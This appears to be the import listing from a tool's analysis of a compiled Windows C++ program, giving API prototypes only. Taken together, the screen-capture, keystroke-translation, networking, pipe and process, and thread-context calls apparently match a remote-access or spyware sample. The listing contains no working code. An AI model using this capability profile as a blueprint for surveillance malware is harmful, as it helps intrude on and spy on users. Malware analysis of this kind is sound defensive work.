// BOOL CreatePipe(_Out_ PHANDLE hReadPipe, _Out_ PHANDLE hWritePipe, _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes, _In_ DWORD nSize);
// BOOL CreateProcessW(_In_opt_ LPCWSTR lpApplicationName, _Inout_opt_ LPWSTR lpCommandLine, _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment, _In_opt_ LPCWSTR lpCurrentDirectory, _In_ LPSTARTUPINFOW lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// HWND CreateWindowExW(_In_ DWORD dwExStyle, _In_opt_ LPCWSTR lpClassName, _In_opt_ LPCWSTR lpWindowName, _In_ DWORD dwStyle, _In_ int X, _In_ int Y, _In_ int nWidth, _In_ int nHeight, _In_opt_ HWND hWndParent, _In_opt_ HMENU hMenu, _In_opt_ HINSTANCE hInstance, _In_opt_ LPVOID lpParam);
// PVOID DecodePointer(_In_opt_ PVOID Ptr);
// LRESULT DefWindowProcW(_In_ HWND hWnd, _In_ UINT Msg, _In_ WPARAM wParam, _In_ LPARAM lParam);
// BOOL DeleteDC(_In_ HDC hdc);
// BOOL DeleteFileA(_In_ LPCSTR lpFileName);
// BOOL DeleteObject(_In_ HGDIOBJ ho);
// BOOL DeviceIoControl(_In_ HANDLE hDevice, _In_ DWORD dwIoControlCode, LPVOID lpInBuffer, _In_ DWORD nInBufferSize, LPVOID lpOutBuffer, _In_ DWORD nOutBufferSize, _Out_opt_ LPDWORD lpBytesReturned, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// LRESULT DispatchMessageW(_In_ const MSG * lpMsg);
// PVOID EncodePointer(_In_opt_ PVOID Ptr);
// VOID ExitProcess(_In_ UINT uExitCode);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileA(_In_ LPCSTR lpFileName, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
// HANDLE FindFirstFileW(_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FindNextFileA(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
// BOOL FindNextFileW(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// HWND FindWindowA(_In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName);
// VOID freeaddrinfo(_In_opt_ PADDRINFOA pAddrInfo);
// void * GdipAlloc(size_t size);
// GpStatus GdipCloneImage(GpImage * image, GpImage ** cloneImage);
// GpStatus GdipCreateBitmapFromHBITMAP(HBITMAP hbm, HPALETTE hpal, GpBitmap ** bitmap);
// GpStatus GdipDisposeImage(GpImage * image);
// void GdipFree(void * ptr);
// GpStatus GdipGetImageEncoders(_In_ UINT numEncoders, _In_ UINT size, ImageCodecInfo * encoders);
// GpStatus GdipGetImageEncodersSize(_Out_ UINT * numEncoders, _Out_ UINT * size);
// VOID GdiplusShutdown(ULONG_PTR token);
// Status GdiplusStartup(OUT ULONG_PTR * token, const GdiplusStartupInput * input, OUT GdiplusStartupOutput * output);
// GpStatus GdipSaveImageToFile(GpImage * image, GDIPCONST WCHAR * filename, GDIPCONST CLSID * clsidEncoder, GDIPCONST EncoderParameters * encoderParams);
// INT getaddrinfo(_In_opt_ PCSTR pNodeName, _In_opt_ PCSTR pServiceName, _In_opt_ const ADDRINFOA * pHints, PADDRINFOA * ppResult);
// DWORD GetCompressedFileSizeA(_In_ LPCSTR lpFileName, _Out_opt_ LPDWORD lpFileSizeHigh);
// BOOL GetComputerNameW(LPWSTR lpBuffer, _Inout_ LPDWORD nSize);
// DWORD GetConsoleTitleA(LPSTR lpConsoleTitle, _In_ DWORD nSize);
// HANDLE GetCurrentProcess(VOID);
// HWND GetDesktopWindow(VOID);
// int GetDeviceCaps(_In_opt_ HDC hdc, _In_ int index);
// BOOL GetDiskFreeSpaceA(_In_opt_ LPCSTR lpRootPathName, _Out_opt_ LPDWORD lpSectorsPerCluster, _Out_opt_ LPDWORD lpBytesPerSector, _Out_opt_ LPDWORD lpNumberOfFreeClusters, _Out_opt_ LPDWORD lpTotalNumberOfClusters);
// DWORD GetEnvironmentVariableA(_In_opt_ LPCSTR lpName, LPSTR lpBuffer, _In_ DWORD nSize);
// DWORD GetEnvironmentVariableW(_In_opt_ LPCWSTR lpName, LPWSTR lpBuffer, _In_ DWORD nSize);
// BOOL GetExitCodeProcess(_In_ HANDLE hProcess, _Out_ LPDWORD lpExitCode);
// DWORD GetFileSize(_In_ HANDLE hFile, _Out_opt_ LPDWORD lpFileSizeHigh);
// struct hostent * gethostbyname(_In_z_ const char * name);
// DWORD GetLastError(VOID);
// VOID GetLocalTime(_Out_ LPSYSTEMTIME lpSystemTime);
// DWORD GetLogicalDriveStringsA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// BOOL GetMessageW(_Out_ LPMSG lpMsg, _In_opt_ HWND hWnd, _In_ UINT wMsgFilterMin, _In_ UINT wMsgFilterMax);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// DWORD GetModuleFileNameW(_In_opt_ HMODULE hModule, LPWSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// HANDLE GetProcessHeap(VOID);
// HGDIOBJ GetStockObject(_In_ int i);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// DWORD GetTempPathW(_In_ DWORD nBufferLength, LPWSTR lpBuffer);
// BOOL GetThreadContext(_In_ HANDLE hThread, _Inout_ LPCONTEXT lpContext);
// DWORD GetTickCount(VOID);
// NOT_BUILD_WINDOWS_DEPRECATE BOOL GetVersionExW(_Inout_ LPOSVERSIONINFOW lpVersionInformation);
// BOOL GetVolumeNameForVolumeMountPointA(_In_ LPCSTR lpszVolumeMountPoint, LPSTR lpszVolumeName, _In_ DWORD cchBufferLength);
// HDC GetWindowDC(_In_opt_ HWND hWnd);
// LONG GetWindowLongW(_In_ HWND hWnd, _In_ int nIndex);
// BOOL GetWindowRect(_In_ HWND hWnd, _Out_ LPRECT lpRect);
// LPVOID HeapAlloc(_In_ HANDLE hHeap, _In_ DWORD dwFlags, _In_ SIZE_T dwBytes);
// HANDLE HeapCreate(_In_ DWORD flOptions, _In_ SIZE_T dwInitialSize, _In_ SIZE_T dwMaximumSize);
// u_short htons(_In_ u_short hostshort);
// unsigned long inet_addr(_In_z_ const char * cp);
// char * inet_ntoa(_In_ struct in_addr in);
// BOOL InternetCloseHandle(_In_ HINTERNET hInternet);
// HINTERNET InternetOpenUrlW(_In_ HINTERNET hInternet, _In_ LPCWSTR lpszUrl, _In_ LPCWSTR lpszHeaders, _In_ DWORD dwHeadersLength, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// HINTERNET InternetOpenW(_In_ LPCWSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCWSTR lpszProxyName, _In_ LPCWSTR lpszProxyBypass, _In_ DWORD dwFlags);
// BOOL InternetReadFile(_In_ HINTERNET hFile, LPVOID lpBuffer, _In_ DWORD dwNumberOfBytesToRead, _Out_ LPDWORD lpdwNumberOfBytesRead);
// BOOL IsProcessorFeaturePresent(_In_ DWORD ProcessorFeature);
// HCURSOR LoadCursorW(_In_opt_ HINSTANCE hInstance, _In_ LPCWSTR lpCursorName);
// HICON LoadIconW(_In_opt_ HINSTANCE hInstance, _In_ LPCWSTR lpIconName);
// HMODULE LoadLibraryW(_In_ LPCWSTR lpLibFileName);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// HLOCAL LocalFree(HLOCAL hMem);
// BOOL LookupPrivilegeValueA(_In_opt_ LPCSTR lpSystemName, _In_ LPCSTR lpName, _Out_ PLUID lpLuid);
// LPSTR lstrcatA(LPSTR lpString1, _In_ LPCSTR lpString2);
// LPWSTR lstrcatW(LPWSTR lpString1, _In_ LPCWSTR lpString2);
// int lstrcmpA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// LPWSTR lstrcpyW(LPWSTR lpString1, _In_ LPCWSTR lpString2);
// int lstrlenA(_In_ LPCSTR lpString);
// int lstrlenW(_In_ LPCWSTR lpString);
// UINT MapVirtualKeyExW(_In_ UINT uCode, _In_ UINT uMapType, _In_opt_ HKL dwhkl);
// BOOL OpenProcessToken(_In_ HANDLE ProcessHandle, _In_ DWORD DesiredAccess, PHANDLE TokenHandle);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int recv(_In_ SOCKET s, char * buf, _In_ int len, _In_ int flags);
// ATOM RegisterClassW(_In_ const WNDCLASSW * lpWndClass);
// BOOL ReleaseMutex(_In_ HANDLE hMutex);
// BOOL RestoreDC(_In_ HDC hdc, _In_ int nSavedDC);
// DWORD ResumeThread(_In_ HANDLE hThread);
// VOID RtlUnwind(_In_opt_ PVOID TargetFrame, _In_opt_ PVOID TargetIp, _In_opt_ PEXCEPTION_RECORD ExceptionRecord, _In_ PVOID ReturnValue);
// int SaveDC(_In_ HDC hdc);
// HGDIOBJ SelectObject(_In_ HDC hdc, _In_ HGDIOBJ h);
// int send(_In_ SOCKET s, const char * buf, _In_ int len, _In_ int flags);
// DWORD SetFilePointer(_In_ HANDLE hFile, _In_ LONG lDistanceToMove, _Inout_opt_ PLONG lpDistanceToMoveHigh, _In_ DWORD dwMoveMethod);
// BOOL SetHandleInformation(_In_ HANDLE hObject, _In_ DWORD dwMask, _In_ DWORD dwFlags);
// int setsockopt(_In_ SOCKET s, _In_ int level, _In_ int optname, const char * optval, _In_ int optlen);
// BOOL SetThreadContext(_In_ HANDLE hThread, _In_ const CONTEXT * lpContext);
// BOOL ShowWindow(_In_ HWND hWnd, _In_ int nCmdShow);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// SOCKET socket(_In_ int af, _In_ int type, _In_ int protocol);
// PCSTR StrStrA(_In_ PCSTR pszFirst, _In_ PCSTR pszSrch);
// PCSTR StrStrIA(_In_ PCSTR pszFirst, _In_ PCSTR pszSrch);
// PCWSTR StrStrIW(_In_ PCWSTR pszFirst, _In_ PCWSTR pszSrch);
// int ToUnicodeEx(_In_ UINT wVirtKey, _In_ UINT wScanCode, const BYTE * lpKeyState, LPWSTR pwszBuff, _In_ int cchBuff, _In_ UINT wFlags, _In_opt_ HKL dwhkl);
// BOOL TranslateMessage(_In_ const MSG * lpMsg);
// BOOL UpdateWindow(_In_ HWND hWnd);
// DWORD WaitForSingleObject(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int wsprintfA(_Out_ LPSTR, _In_ LPCSTR, ...);
// int wsprintfW(_Out_ LPWSTR, _In_ LPCWSTR, ...);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (12.0)
// Detected language: C++
// Detected functions: 170
